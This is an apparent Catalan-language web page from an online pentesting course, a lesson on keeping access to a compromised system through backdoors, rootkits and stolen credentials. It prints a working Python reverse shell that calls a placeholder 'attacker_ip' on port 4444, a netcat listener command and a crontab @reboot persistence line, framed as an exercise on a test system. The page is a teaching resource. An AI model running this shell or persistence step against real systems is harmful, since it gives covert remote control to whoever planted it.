<!DOCTYPE html>
<html lang="ca">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Manteniment de l'Accés</title>

    <link rel="alternate" href="https://campusempresa.com/es/pentesting/mantenimiento-acceso" hreflang="es" />
    <link rel="alternate" href="https://campusempresa.com/es/pentesting/mantenimiento-acceso" hreflang="x-default" />
	<link rel="alternate" href="https://campusempresa.com/ca/pentesting/mantenimiento-acceso" hreflang="ca" />
    
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.css" rel="stylesheet">
	
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="text/javascript" src="/js/main.js"></script>
</head>

<body>
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-8 p-0">
			<h1 class="m-0 p-0">
				<a href="/ca/"><img src="/img/logo_header.png" style="visibility:hiddenxx;"></a>
			</h1>
		</div>
		<div class="col-4 p-0 text-end">
			<h2 id="main_title"><cite>Construint la societat d'avui i del demà</cite></h2>
			<h3 id="main_subtitle"></h3>
		</div>
	</div>
</div>
<div class="container-xxl" style="margin-top: -1em;">
	<div class="row">
		<div class="col-12 p-0 m-0 text-end">
							<a href="/es/pentesting/mantenimiento-acceso" id="lnk_lang_es" data-lang="es" class="px-2">ES</a></b>
				|
				<b id="lit_lang_ca" class="px-2">CA</b>
								</div>
	</div>
</div>
   <div class="top-bar container-fluid">
	<div class="container-xxl">
		<div class="row">
			<div class="col" id="left_menu">
				<a href="/ca/objective">El Projecte</a>
				<a href="/ca/about">Sobre nosaltres</a>
				<a href="/ca/contribute">Contribuir</a>
				<a href="/ca/donate">Donacions</a>
				<a href="/ca/licence">Llicència</a>
			</div>
		</div>
	</div>
   </div>

<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
			<div id="nav1" class="navigation"></div>
			<div id="inner_content"><div class='row navigation'><div class='col-6'></div><div class='col-6 text-end'></div></div><div class='content'><p>En aquesta secció del curs sobre Pentesting, ens enfocarem en el manteniment de l'accés. Aquest és un pas crucial en el procés de proves de penetració, ja que permet als pentesters mantenir la seva presència en el sistema objectiu després d'haver obtingut accés inicial. Això és essencial per realitzar anàlisis més profunds i recopilar informació addicional.</p>
</div><h1>Objectius del Manteniment de l'Accés</h1>
<div class='content'><ul>
<li><strong>Persistència</strong>: Assegurar que l'accés al sistema es mantingui fins i tot després de reinicis o canvis en la xarxa.</li>
<li><strong>Evasió</strong>: Evitar la detecció per part de sistemes de seguretat i administradors.</li>
<li><strong>Control</strong>: Mantenir la capacitat d'executar comandes i extreure dades del sistema compromès.</li>
</ul>
</div><h1>Tècniques Comunes per al Manteniment de l'Accés</h1>
<div class='content'></div><h2>Backdoors</h2>
<div class='content'><p>Les backdoors són mètodes per accedir a un sistema que eludeixen l'autenticació normal. Poden ser instal·lades en el sistema compromès per permetre l'accés en el futur.</p>
<ul>
<li><strong>Tipus de Backdoors</strong>:
<ul>
<li><strong>Shells inverses</strong>: El sistema compromès es connecta de tornada a l'atacant.</li>
<li><strong>Shells bind</strong>: L'atacant es connecta directament al sistema compromès.</li>
</ul>
</li>
</ul>
<h4>Exemple de Shell Inversa en Python</h4>
</div><div style='position:relative'><a class='copy_button' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwoKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiYXR0YWNrZXJfaXAiLCA0NDQ0KSkKCndoaWxlIFRydWU6CiAgICBjb21tYW5kID0gcy5yZWN2KDEwMjQpLmRlY29kZSgpCiAgICBpZiBjb21tYW5kLmxvd2VyKCkgPT0gImV4aXQiOgogICAgICAgIGJyZWFrCiAgICBvdXRwdXQgPSBzdWJwcm9jZXNzLnJ1bihjb21tYW5kLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlKQogICAgcy5zZW5kKG91dHB1dC5zdGRvdXQgKyBvdXRwdXQuc3RkZXJyKQoKcy5jbG9zZSgp"))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'>import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((&quot;attacker_ip&quot;, 4444))

while True:
    command = s.recv(1024).decode()
    if command.lower() == &quot;exit&quot;:
        break
    output = subprocess.run(command, shell=True, capture_output=True)
    s.send(output.stdout + output.stderr)

s.close()</pre></div><div class='content'></div><h2>Rootkits</h2>
<div class='content'><p>Els rootkits són eines que permeten als atacants mantenir l'accés i ocultar la seva presència en el sistema compromès.</p>
<ul>
<li><strong>Tipus de Rootkits</strong>:
<ul>
<li><strong>Kernel-level</strong>: Modifiquen el nucli del sistema operatiu.</li>
<li><strong>User-level</strong>: Operen en l'espai d'usuari i són més fàcils de detectar.</li>
</ul>
</li>
</ul>
</div><h2>Credencials Robades</h2>
<div class='content'><p>L'ús de credencials robades és una tècnica comuna per mantenir l'accés. Els atacants poden capturar credencials mitjançant keyloggers, phishing, o exploits.</p>
<ul>
<li><strong>Mètodes de Captura</strong>:
<ul>
<li><strong>Keyloggers</strong>: Registren les pulsacions de tecles.</li>
<li><strong>Phishing</strong>: Enganyen els usuaris perquè revelin les seves credencials.</li>
<li><strong>Exploits</strong>: Aprofiten vulnerabilitats per obtenir credencials.</li>
</ul>
</li>
</ul>
</div><h1>Eines Populars per al Manteniment de l'Accés</h1>
<div class='content'><p>| Eina               | Descripció                                                                  | Ús Principal        |
|--------------------|-----------------------------------------------------------------------------|---------------------|
| Metasploit         | Framework de pentesting que inclou mòduls per a backdoors i persistència.   | Shells inverses     |
| Empire             | Framework de post-explotació que facilita la persistència i evasió.         | Persistència        |
| Cobalt Strike      | Plataforma de simulació d'adversaris que inclou eines d'accés.              | Control i evasió    |</p>
</div><h1>Exercici Pràctic</h1>
<div class='content'></div><h2>Objectiu</h2>
<div class='content'><p>Instal·lar una shell inversa en un sistema de prova i mantenir l'accés després d'un reinici.</p>
</div><h2>Passos</h2>
<div class='content'><ol>
<li>
<p><strong>Configurar el Listener</strong>:</p>
<ul>
<li>En el sistema atacant, configurar un listener usant Netcat:
<pre><code class="language-bash">nc -lvp 4444
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Crear la Shell Inversa</strong>:</p>
<ul>
<li>En el sistema objectiu, crear un script de shell inversa en Python (com l'exemple anterior).</li>
</ul>
</li>
<li>
<p><strong>Automatitzar la Persistència</strong>:</p>
<ul>
<li>Crear un script d'inici en el sistema objectiu per executar la shell inversa a l'inici:
<pre><code class="language-bash">echo &quot;@reboot python /path/to/reverse_shell.py&quot; &gt;&gt; /etc/crontab
</code></pre>
</li>
</ul>
</li>
<li>
<p><strong>Reiniciar el Sistema</strong>:</p>
<ul>
<li>Reiniciar el sistema objectiu i verificar que l'accés es manté.</li>
</ul>
</li>
</ol>
</div><h1>Conclusió</h1>
<div class='content'><p>El manteniment de l'accés és una etapa crítica en el pentesting que permet als atacants realitzar anàlisis continus i profunds en el sistema compromès. Comprendre i aplicar tècniques com backdoors, rootkits i l'ús de credencials robades és essencial per a qualsevol pentester. A més, l'ús d'eines especialitzades pot facilitar enormement aquest procés. Practicar aquestes tècniques en entorns controlats és fonamental per desenvolupar habilitats efectives i segures.</p>
</div><div class='row navigation'><div class='col-6'></div><div class='col-6 text-end'></div></div></div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
			<h1>Publicitat</h1>
			<p>Aquest espai està destinat a publicitat.</p>
			<p>Si vols ser patrocinador, contacta amb nosaltres per incloure enllaços en aquesta zona: <a href='mailto:admin@campusempresa.cat'>admin@campusempresa.cat</a></p>
			<p>Gràcies per col·laborar!</p>
		</div>
	</div>
</div>

   <div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. Tots els drets reservats</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir galetes per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Entès!</a>
    <a href="/ca/cookies">Més informació</a>
</div>	

	</div>    
</body>
</html>
